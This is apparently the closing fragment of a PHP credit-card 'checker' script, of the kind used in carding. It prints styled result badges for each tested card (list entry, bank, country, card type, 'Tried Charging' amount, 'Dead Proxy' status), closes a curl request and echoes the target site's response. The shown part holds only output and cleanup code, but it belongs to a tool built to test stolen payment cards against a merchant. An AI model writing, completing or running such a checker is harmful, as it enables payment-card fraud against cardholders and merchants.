    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Dead Proxy/Error Not listed」 </span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
}

  curl_close($curl);
  ob_flush();
  //////=========Comment Echo $result If U Want To Hide Site Side Response
  echo $result;

///////////////////////////////////////////////===========================DecodeX================================================\\\\\\\\\\\\\\\

?>